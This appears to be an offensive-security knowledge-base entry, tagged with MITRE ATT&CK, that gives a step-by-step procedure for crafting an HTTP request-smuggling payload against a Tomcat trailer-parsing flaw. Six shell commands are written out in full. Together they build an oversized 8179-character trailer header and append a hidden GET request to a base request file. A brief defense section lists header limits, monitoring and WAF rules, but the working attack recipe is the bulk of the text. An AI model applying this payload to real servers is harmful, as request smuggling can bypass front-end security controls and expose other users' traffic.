---
tags:
  - payload-crafting
  - http
  - smuggling
type: procedure
tools:
  - '[[tools/echo]]'
  - '[[tools/seq]]'
  - '[[tools/perl]]'
  - '[[tools/head]]'
  - '[[tools/cat]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/echo-create-file]]'
  - '[[commands/for-loop-append-string]]'
  - '[[commands/perl-append-crlf]]'
  - '[[commands/head-extract-lines]]'
  - '[[commands/cat-append-file]]'
  - '[[commands/perl-append-smuggled-request]]'
platforms:
  - Linux
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: c5a7bfe8-1826-44ed-b6be-6cc16b63e8b7
created_at: '2025-12-13T09:01:22.363Z'
updated_at: '2025-12-13T09:01:22.363Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft Oversized Trailer Payload

## Summary

This procedure crafts a malicious HTTP payload with an oversized trailer header to exploit the Tomcat parsing vulnerability, enabling request smuggling.

## Description

The payload is built by creating a file with a trailer header that exceeds the size limit, causing an IOException in Tomcat. This leads to the server treating a single request as multiple. The process uses shell commands to generate the oversized string and append a smuggled GET request.

## Requirements

1. Linux shell access
2. Perl installed
3. Base.txt file available from the repository

## Defense

Defensive measures and detection strategies:

- Configure Tomcat to enforce strict header size limits
- Monitor HTTP traffic for anomalous headers
- Use WAF rules to detect oversized headers

## Objectives

1. Generate an oversized trailer header
2. Combine with a smuggled request
3. Prepare payload for delivery

## Instructions

### Step 1: Create Trailer Prefix

**Context**: Initialize the trailer header file.

**Command** ([[commands/echo-create-file]]):
```bash
echo -n "testtrailer: " > 8190_EXCLUDE_COLON_SP_CR_LF.txt
```

> Writes the header prefix without newline.

### Step 2: Append Oversized String

**Context**: Add characters to exceed size limit.

**Command** ([[commands/for-loop-append-string]]):
```bash
for i in `seq 8179`; do echo -n "a"; done >> 8190_EXCLUDE_COLON_SP_CR_LF.txt
```

> Appends 8179 'a' characters.

### Step 3: Append CRLF

**Context**: Complete the header line.

**Command** ([[commands/perl-append-crlf]]):
```bash
perl -e 'print "\r\n"' >> 8190_EXCLUDE_COLON_SP_CR_LF.txt
```

> Adds carriage return and newline.

### Step 4: Extract Base Request

**Context**: Prepare the base HTTP request.

**Command** ([[commands/head-extract-lines]]):
```bash
head -11 base.txt > attack5.txt
```

> Copies first 11 lines to new file.

### Step 5: Append Trailer

**Context**: Add the oversized trailer.

**Command** ([[commands/cat-append-file]]):
```bash
cat 8190_EXCLUDE_COLON_SP_CR_LF.txt >> attack5.txt
```

> Appends the trailer file.

### Step 6: Append Smuggled Request

**Context**: Add the hidden GET request.

**Command** ([[commands/perl-append-smuggled-request]]):
```bash
perl -e 'print "a: GET /examples/?this_is_attack HTTP/1.1\r\nHost: attack\r\n\r\n"' >> attack5.txt
```

> Appends the smuggled request.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/echo-create-file]]
- [[commands/for-loop-append-string]]
- [[commands/perl-append-crlf]]
- [[commands/head-extract-lines]]
- [[commands/cat-append-file]]
- [[commands/perl-append-smuggled-request]]

## Tools Used

- [[tools/echo]]
- [[tools/seq]]
- [[tools/perl]]
- [[tools/head]]
- [[tools/cat]]

## Tags

- [[payload-crafting]]
- [[http]]
- [[smuggling]]
